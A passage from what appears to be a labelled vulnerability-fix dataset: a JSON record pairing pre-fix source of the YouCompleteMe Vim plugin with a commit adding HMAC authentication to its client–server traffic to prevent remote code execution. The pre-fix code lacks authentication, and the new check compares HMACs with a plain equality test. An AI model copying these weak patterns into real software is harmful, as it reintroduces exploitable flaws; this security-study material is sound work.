)","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]}],"source":"\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http:\/\/localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server\/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https:\/\/github.com\/Valloric\/YouCompleteMe\/issues\/641\n#  https:\/\/github.com\/kennethreitz\/requests\/issues\/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server\/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}},"msg":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}},"https:\/\/github.com\/yeoman-ym\/YouCompleteMe":{"e965e0284789e610c0a50d20a92a82ec5c135064":{"url":"https:\/\/api.github.com\/repos\/yeoman-ym\/YouCompleteMe\/commits\/e965e0284789e610c0a50d20a92a82ec5c135064","html_url":"https:\/\/github.com\/yeoman-ym\/YouCompleteMe\/commit\/e965e0284789e610c0a50d20a92a82ec5c135064","message":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.","sha":"e965e0284789e610c0a50d20a92a82ec5c135064","keyword":"remote code execution prevent","diff":"diff --git a\/python\/ycm\/client\/base_request.py b\/python\/ycm\/client\/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a\/python\/ycm\/client\/base_request.py\n+++ b\/python\/ycm\/client\/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests\/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http:\/\/localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a\/python\/ycm\/server\/hmac_plugin.py b\/python\/ycm\/server\/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- \/dev\/null\n+++ b\/python\/ycm\/server\/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!\/usr\/bin\/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and\/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http:\/\/bottlepy.org\/docs\/dev\/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a\/python\/ycm\/server\/ycmd.py b\/python\/ycm\/server\/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a\/python\/ycm\/server\/ycmd.py\n+++ b\/python\/ycm\/server\/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a\/python\/ycm\/utils.py b\/python\/ycm\/utils.py\nindex d9128716..095337c9 100644\n--- a\/python\/ycm\/utils.py\n+++ b\/python\/ycm\/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a\/python\/ycm\/youcompleteme.py b\/python\/ycm\/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a\/python\/ycm\/youcompleteme.py\n+++ b\/python\/ycm\/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in 